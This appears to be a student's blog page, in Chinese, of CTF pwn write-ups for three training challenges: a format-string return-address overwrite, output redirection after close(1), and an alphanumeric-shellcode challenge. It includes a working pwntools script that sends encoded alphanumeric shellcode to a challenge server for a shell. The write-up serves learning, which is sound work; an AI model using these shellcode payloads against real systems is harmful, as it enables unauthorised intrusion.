@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html>
+  <head>
+     
+    <meta charset="UTF-8">
+    <title>集训5-6周wp - Hexo</title>
+    <link rel="shortcut icon" href="/static/img/icon.png">
+    <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
+    
+<link rel="stylesheet" href="/static/kico.css">
+<link rel="stylesheet" href="/static/hingle.css">
+
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <meta name="viewport" content="width=device-width, maximum-scale=1, initial-scale=1"/>
+    <meta property="og:site_name" content="Hexo">
+    <meta property="og:title" content="集训5-6周wp"/>
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+  <body>
+    <header>
+    <div class="head-title">
+        <h4>Hexo</h4>
+    </div>
+    <div class="head-action">
+        <div class="toggle-btn"></div>
+        <div class="light-btn"></div>
+        <div class="search-btn"></div>
+    </div>
+    <form class="head-search" method="post">
+        <input type="text" name="s" placeholder="搜索什么？">
+    </form>
+    <nav class="head-menu">
+        <a href="/">首页</a>
+        <div class="has-child">
+            <a>分类</a>
+            <div class="sub-menu">
+                
+            </div>
+        </div>
+        
+            <a href="/about">关于我</a>
+        
+            <a href="/friends">朋友们</a>
+        
+    </nav>
+</header>
+
+    <main>
+    <div class="wrap min">
+        <section class="post-title">
+            <h2>集训5-6周wp</h2>
+            <div class="post-meta">
+                <time class="date">2024.03.05</time>
+            
+            </div>
+        </section>
+        <article class="post-content">
+        
+            <h1 id="1-HCTF，小明的家庭住址（格式化字符串入门）"><a href="#1-HCTF，小明的家庭住址（格式化字符串入门）" class="headerlink" title="1.HCTF，小明的家庭住址（格式化字符串入门）"></a>1.HCTF，小明的家庭住址（格式化字符串入门）</h1><p>64位ida打开没啥好说的</p>
+<p><img src="https://img.picgo.net/2023/12/04/Snipaste_2023-12-04_15-18-01f28c3f647d23bb2d.png" alt="Snipaste_2023-12-04_15-18-01f28c3f647d23bb2d.png"></p>
+<p>看了一下read，发现只读入48字节，，两个read都没有溢出。但是看到了printf存在格式化字符串漏洞，可以借此实现任意写。</p>
+<p><img src="https://img.picgo.net/2023/12/04/Snipaste_2023-12-04_15-20-361abd4ce8d067ed6c.png" alt="Snipaste_2023-12-04_15-20-361abd4ce8d067ed6c.png"></p>
+<p>发现ma1n中存在后门函数。那就需要找一个ret地址，通过上文的漏洞往ret地址上写后门函数的地址，就可以get shell了。这里有两个printf可以利用两次，第一次泄露ret地址，第二次往ret地址上写就可以了，思路十分清晰。</p>
+<h1 id="2-wustctf2020-closed（不搜wp你能试试自己做出来吗）"><a href="#2-wustctf2020-closed（不搜wp你能试试自己做出来吗）" class="headerlink" title="2.wustctf2020_closed（不搜wp你能试试自己做出来吗）"></a>2.wustctf2020_closed（不搜wp你能试试自己做出来吗）</h1><p>好吧一搜就搜到wp了，了解了一下原理。<br><img src="https://img.picgo.net/2023/12/04/20210112091302876789520b169263a87.png" alt="20210112091302876789520b169263a87.png"></p>
+<p><img src="https://img.picgo.net/2023/12/04/20210112091151154b71611e1e4d4376d.png" alt="20210112091151154b71611e1e4d4376d.png"></p>
+<p>这个程序直接给我们了shell，但是通过close关闭了输出。</p>
+<blockquote>
+<p>0是标准输入</p>
+<p>1是标准输出</p>
+<p>2是错误输出</p>
+<p>close（1）关闭了标准输出</p>
+<p>close（2）关闭了标准错误</p>
+</blockquote>
+<p>然后查了一下输出重定向：</p>
+<p><img src="https://img.picgo.net/2023/12/04/Snipaste_2023-12-04_15-35-57a2b106e0058e3449.png" alt="Snipaste_2023-12-04_15-35-57a2b106e0058e3449.png"></p>
+<p>可以看到直接cat flag是没有输出的，但是后面加上1&gt;&amp;0就可以看到输出了（这句的作用是把标准输出重定向到标准输入也就是终端）</p>
+<p><img src="https://img.picgo.net/2023/12/04/Snipaste_2023-12-04_15-38-04761aef0b9951da20.png" alt="Snipaste_2023-12-04_15-38-04761aef0b9951da20.png"></p>
+<p>当然也可以抄别人wp里写的execv 1&gt;&amp;0，直接永久重定向了，不用每一句后面都加一句1&gt;&amp;0，更方便了。</p>
+<h1 id="3-PWN——mrctf2020-shellcode-revenge：（诶，这个也是ret2shellcode，有什么不一样呢？）"><a href="#3-PWN——mrctf2020-shellcode-revenge：（诶，这个也是ret2shellcode，有什么不一样呢？）" class="headerlink" title="3.PWN——mrctf2020_shellcode_revenge：（诶，这个也是ret2shellcode，有什么不一样呢？）"></a>3.PWN——mrctf2020_shellcode_revenge：（诶，这个也是ret2shellcode，有什么不一样呢？）</h1><p>懒得贴checksec图了，反正没开NX可以执行shellcode（要是开了还能叫shellcode_revenge么doge）</p>
+<p>首先ida逆向发现报错了，报错地址124D的位置，那就去看看是什么指令。</p>
+<p><img src="https://img.picgo.net/2023/12/04/Snipaste_2023-12-04_15-43-58e0409d13a59fe83d.png" alt="Snipaste_2023-12-04_15-43-58e0409d13a59fe83d.png"><br><img src="https://img.picgo.net/2023/12/04/Snipaste_2023-12-04_15-46-55c231a740df89d90c.png" alt="Snipaste_2023-12-04_15-46-55c231a740df89d90c.png"></p>
+<p>观察到是call rax，再看上一行，作用是把buf的地址赋给了rax，那么连起来就是执行buf里面的指令了。那就去看看buf怎么来的呗。</p>
+<p><img src="https://img.picgo.net/2023/12/04/Snipaste_2023-12-04_15-48-4399da1581c88d6cdb.png" alt="Snipaste_2023-12-04_15-48-4399da1581c88d6cdb.png"></p>
+<p>在主函数里可以看到call了一个read，然后看read的参数发现执行的是read(0,buf,0x400)</p>
+<p><img src="https://img.picgo.net/2023/12/04/Snipaste_2023-12-04_15-54-08d5966735b7031a52.png" alt="Snipaste_2023-12-04_15-54-08d5966735b7031a52.png"></p>
+<p><img src="https://img.picgo.net/2023/12/04/Snipaste_2023-12-04_15-55-3481e9785dbe46d124.png" alt="Snipaste_2023-12-04_15-55-3481e9785dbe46d124.png"></p>
+<p>这里可以用刚学的骚操作，右键124D然后点NOP把指令改为NOP（就是空指令）然后就可以反汇编啦。</p>
+<p><img src="https://img.picgo.net/2023/12/04/Snipaste_2023-12-04_15-56-49721d77ec62600b54.png" alt="Snipaste_2023-12-04_15-56-49721d77ec62600b54.png"></p>
+<p>这里也能看出来执行的是read(0,buf,0x400)。</p>
+<p>ok扯了一堆就是要说明这个程序的目的就是执行你输入的东西，本来直接send一个shellcode就行，但是这题叫revenge就是revenge在它加了一个if条件，如果不满足就不执行shellcode，看了一下只能用A<del>Z，a</del>z，0~9 。</p>
+<p>ok，寄，可见shellcode手搓不了一点。（坐牢1个多小时才装成功shellcode的脚本）</p>
+<p>按照<a target="_blank" rel="noopener" href="https://blog.csdn.net/SmalOSnail/article/details/105236336">链接</a>的教程来的，alpha3死活装不上，最后用的ae64，整出了一个和alpha3不一样的可见shellcode，啊哈哈哈鸡汤来喽：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">ip = <span class="string">&#x27;node4.buuoj.cn:26244&#x27;</span>.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">c = remote(ip[<span class="number">0</span>],ip[<span class="number">1</span>])</span><br><span class="line">p1 = <span class="string">&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span>//alpha3的shellcode</span><br><span class="line">p2 = <span class="string">&#x27;WTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjcTYfi9O60t800T810T850T860T870T8A0t8B0T8D0T8E0T8F0T8G0T8H0T8P0t8T0T8YRAPZ0t8J0T8M0T8N0t8Q0t8U0t8WZjUTYfi9860t800T850T8P0T8QRAPZ0t81ZjhHpzbinzzzsPHAghriTTI4qTTTT1vVj8nHTfVHAf1RjnXZP&#x27;</span>//ae64的shellcode</span><br><span class="line">c.send(p2)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>
+
+
+        </article>
+        <section class="post-near">
+            <ul>
+                
+                    <li>上一篇: <a href="/2024/03/05/%E9%9B%86%E8%AE%AD1-2%E5%91%A8wp/">集训1-2周wp</a></li>
+                
+                
+                    <li>下一篇: 看完啦 (つд⊂)</li>
+                
+            </ul>
+        </section>
+        
+    
+        <section class="post-author">
+        
+            <figure class="author-avatar">
+                <img src="https://avatars.githubusercontent.com/u/149282793?v=4" alt="Skynion" />
+            </figure>
+        
+            <div class="author-info">
+                <h4>Skynion</h4>
+                <p>学习Pwn ing</p>
+            </div>
+        </section>
+    
+    </div>
+</main>
+
+    <footer>
+    <div class="buttons">
+        <a class="to-top" href="#"></a>
+    </div>
+    <div class="wrap min">
+        <section class="widget">
+            <div class="row">
+                <div class="col-m-4">
+                    <h3 class="title-recent">最新文章：</h3>
+                    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2024/03/05/%E5%AF%92%E5%81%87%E7%AC%AC1%E5%91%A8wp/">寒假第1周wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/03/05/%E9%9B%86%E8%AE%AD3-4%E5%91%A8wp/">集训3-4周wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/03/05/%E7%9F%B3%E5%A4%B4%E5%89%AA%E5%88%80%E5%B8%83/">石头剪刀布wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/03/05/%E9%9B%86%E8%AE%AD1-2%E5%91%A8wp/">集训1-2周wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/03/05/%E9%9B%86%E8%AE%AD5-6%E5%91%A8wp/">集训5-6周wp</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-date">时光机：</h3>
+                    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-tags">标签云：</h3>
+                    
+                </div>
+            </div>
+        </section>
+        <section class="sub-footer">
+            <p>© 2024 <a href="/">Hexo</a>. All Rights Reserved. Theme By <a href="https://github.com/Dreamer-Paul/Hingle" target="_blank" rel="nofollow">Hingle</a>.</p>
+        </section>
+    </div>
+</footer>
+
+
+<script src="/static/kico.js"></script>
+<script src="/static/hingle.js"></script>
+
+
+<script>var hingle = new Paul_Hingle({"copyright":true,"night":true});</script>
+
+  </body>
+</html>
